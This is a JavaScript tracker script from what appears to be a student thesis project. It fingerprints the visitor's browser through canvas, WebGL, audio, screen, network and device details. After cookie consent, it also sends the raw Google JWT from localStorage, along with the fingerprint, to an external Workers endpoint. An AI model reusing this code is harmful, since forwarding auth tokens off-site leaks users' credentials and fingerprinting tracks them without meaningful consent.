/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tracker.js                                         :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agarcia2 <agarcia2@student.42barcelona.    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/02/27 09:04:43 by agarcia2          #+#    #+#             */
/*   Updated: 2026/02/27 09:11:55 by agarcia2         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

function decodeJWT(token)
{
	if (!token) return null;
	try
	{
		const payload = token.split(".")[1];
		const base64 = payload.replace(/-/g, "+").replace(/_/g, "/");
		return JSON.parse(atob(base64));
	}
	catch (_) { return null; }
}

async function fp_canvas()
{
	const canvas = document.createElement("canvas");
	const ctx = canvas.getContext("2d");
	ctx.textBaseline = "top";
	ctx.font = "16px 'Arial'";
	ctx.fillStyle = "#f00";
	ctx.fillText("ITSALEXITO-FP", 2, 2);
	return canvas.toDataURL();
}

async function fp_audio()
{
	try
	{
		const ctx = new (window.AudioContext || window.AudioContext)();
		return ctx.sampleRate;
	}
	catch (_) { return null; }
}

function fp_webgl()
{
	try
	{
		const canvas = document.createElement("canvas");
		const gl = canvas.getContext("webgl");
		if (!gl) return null;

		const debug = gl.getExtension("WEBGL_debug_renderer_info");
		return {
			vendor: debug ?
				gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null,
			renderer: debug ?
				gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null
		};
	}
	catch (_) { return null; }
}

function get_network()
{
	const c = navigator.connection || navigator.webkitConnection || {};
	return {
		type: c.effectiveType || null,
		downlink: c.downlink || null,
		rtt: c.rtt || null,
		saveData: c.saveData || false
	};
}

async function getFingerprint()
{
	return {
		canvas: await fp_canvas(),
		audioRate: await fp_audio(),
		webgl: fp_webgl(),
		tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
		entropy: crypto.getRandomValues(new Uint32Array(8)).join("-")
	};
}

async function sendTracker()
{
	const fp = await getFingerprint();
	const raw_jwt = localStorage.getItem("google_jwt");
	const decoded = decodeJWT(raw_jwt);
	const google_id = decoded?.sub || "unknown";

	const data =
	{
		google_id: google_id,
		google_jwt: raw_jwt,
		device:
		{
			platform: navigator.platform,
			platformVersion: navigator.userAgentData?.platformVersion || null,
			deviceMemory: navigator.deviceMemory || null,
			hardwareConcurrency: navigator.hardwareConcurrency || null,
			maxTouchPoints: navigator.maxTouchPoints || 0
		},
		browser:
		{
			userAgent: navigator.userAgent,
			language: navigator.language,
			languages: navigator.languages,
			cookiesEnabled: navigator.cookieEnabled,
			localStorage: !!window.localStorage,
			sessionStorage: !!window.sessionStorage,
			plugins: [...navigator.plugins].map(p => p.name)
		},
		screen:
		{
			width: screen.width,
			height: screen.height,
			availWidth: screen.availWidth,
			availHeight: screen.availHeight,
			colorDepth: screen.colorDepth,
			pixelRatio: window.devicePixelRatio
		},
		window:
		{
			innerWidth: window.innerWidth,
			innerHeight: window.innerHeight,
			outerWidth: window.outerWidth,
			outerHeight: window.outerHeight
		},
		network: get_network(),
		fingerprint: fp,
		timestamp: new Date().toISOString()
	};
	fetch("https://tfg-tracker.alexgaro2015-5ed.workers.dev",
	{
		method: "POST",
		headers: { "Content-Type": "application/json" },
		body: JSON.stringify(data)
	});
}

if (localStorage.getItem("cookies-accepted") === "true")
	sendTracker();